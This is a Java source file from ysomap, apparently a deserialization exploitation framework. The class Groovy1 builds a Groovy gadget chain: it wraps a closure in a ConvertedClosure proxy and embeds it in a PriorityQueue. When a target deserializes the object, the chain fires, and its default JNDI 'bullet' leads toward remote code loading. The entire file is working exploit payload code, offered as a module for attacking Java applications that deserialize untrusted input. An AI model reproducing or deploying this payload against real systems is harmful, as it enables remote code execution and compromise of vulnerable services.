package ysomap.payloads.java.groovy;

import groovy.lang.Closure;
import org.codehaus.groovy.runtime.ConvertedClosure;
import ysomap.bullets.Bullet;
import ysomap.bullets.groovy.ClosureWithJNDIBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;
import ysomap.payloads.AbstractPayload;

import java.lang.reflect.Proxy;

/**
 * @author wh1t3p1g
 * @since 2021/8/6
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.FROHOFF })
@Targets({Targets.JDK})
@Require(bullets = {"ClosureWithJNDIBullet"},param = false)
@Dependencies({"org.codehaus.groovy:groovy:2.4.3"})
public class Groovy1 extends AbstractPayload<Object> {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return ClosureWithJNDIBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        ConvertedClosure closure = new ConvertedClosure((Closure) obj, "compareTo");
        Object map = Proxy.newProxyInstance(
                Groovy1.class.getClassLoader(),
                new Class<?>[]{Comparable.class}, closure);
        return PayloadHelper.makePriorityQueue(map,false);
    }
}
